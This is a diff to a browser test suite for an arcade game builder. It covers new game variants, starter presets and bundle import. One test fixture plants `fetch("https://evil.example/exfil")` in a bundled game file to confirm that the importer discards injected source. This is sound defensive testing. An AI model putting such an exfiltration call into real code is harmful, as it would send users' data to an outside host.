@@ -36,8 +36,9 @@ try {
     return m.package_kind === 'arcade_game' && m.entry === 'game.mjs' && m.adapter === 'adapter.mjs' && m.assets.length === 0 && m.capabilities.length === 0;
   }));
 
-  // all eight closed variants generate importer-clean source
-  const ALL_VARIANTS = ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate', 'split-pulse', 'rail-runner', 'echo-grid'];
+  // all fourteen closed variants generate importer-clean source
+  const ALL_VARIANTS = ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate', 'split-pulse', 'rail-runner', 'echo-grid',
+    'phase-lock', 'heat-sync', 'light-bloom', 'signal-climb', 'crosswalk-pulse', 'memory-echo'];
   for (const v of ALL_VARIANTS) {
     await page.selectOption('#variant', v);
     await page.waitForTimeout(100);
@@ -59,13 +60,20 @@ try {
     return imports.length === 1 && /from '\.\/game\.mjs'/.test(imports[0]);
   }));
 
-  // throughput: templates are parameter presets — picking one re-gates through the importer
-  await page.selectOption('#template', 'showpiece');
+  // throughput: starters are named parameter presets — picking one re-gates through the importer
+  await page.selectOption('#template', 'orbit-snag');
   await page.waitForTimeout(100);
-  check('template applies its closed params and stays importer-VALID', await page.evaluate(() => {
+  check('starter applies its closed params + naming and stays importer-VALID', await page.evaluate(() => {
     const p = window.__cf_builder.currentParams();
-    return p.variant === 'orbit-catch' && p.accent === 'magenta' && p.speed === 'fast' && window.__cf_builder.lastReport.ok === true;
+    return p.variant === 'orbit-catch' && p.accent === 'cyan' && p.speed === 'fast'
+      && p.package_id === 'orbit-snag' && p.display_name === 'Orbit Snag' && window.__cf_builder.lastReport.ok === true;
   }));
+  check('starter metadata card renders pitch + tags + notes (closed copy)', await page.evaluate(() => {
+    const m = document.getElementById('starterMeta');
+    return m && !m.hidden && /Snag the satellite/.test(m.textContent) && /Position/.test(m.textContent) && /Reduced motion/.test(m.textContent);
+  }));
+  check('starter library exposes ≥12 starters in the picker', await page.evaluate(() =>
+    window.__cf_builder.starterCount >= 12 && document.querySelectorAll('#template option').length >= 13));
   check('bundle export enabled on valid', !(await page.evaluate(() => document.getElementById('exportBundle').disabled)));
 
   // throughput: bundle import restores PARAMS ONLY — bundled source is ignored and regenerated
@@ -75,7 +83,7 @@ try {
     buffer: Buffer.from(JSON.stringify({
       schema_version: 1,
       bundle_kind: 'arcade_builder_bundle',
-      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', frame: 'cabinet-480x480', budget: 32768 },
+      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', difficulty: 'chill', motion: 'calm', frame: 'cabinet-480x480', budget: 32768 },
       files: { 'game.mjs': 'fetch("https://evil.example/exfil"); // MALICIOUS_MARKER' },
       manifest: { package_id: 'evil-injected' },
     })),
@@ -83,7 +91,8 @@ try {
   await page.waitForFunction(() => window.__cf_builder.currentParams().package_id === 'restored-cab', null, { timeout: 4000 });
   check('bundle import restores parameters through the closed tables', await page.evaluate(() => {
     const p = window.__cf_builder.currentParams();
-    return p.variant === 'tri-light' && p.accent === 'green' && p.speed === 'slow' && p.display_name === 'Restored Cabinet' && p.frame === 'cabinet-480x480';
+    return p.variant === 'tri-light' && p.accent === 'green' && p.speed === 'slow' && p.display_name === 'Restored Cabinet'
+      && p.frame === 'cabinet-480x480' && p.difficulty === 'chill' && p.motion === 'calm';
   }));
   check('bundled source is IGNORED — generated game.mjs carries none of it', await page.evaluate(() =>
     !/MALICIOUS_MARKER|evil\.example|evil-injected/.test(window.__cf_builder.lastBuild.files['game.mjs'] + JSON.stringify(window.__cf_builder.lastBuild.manifest))));
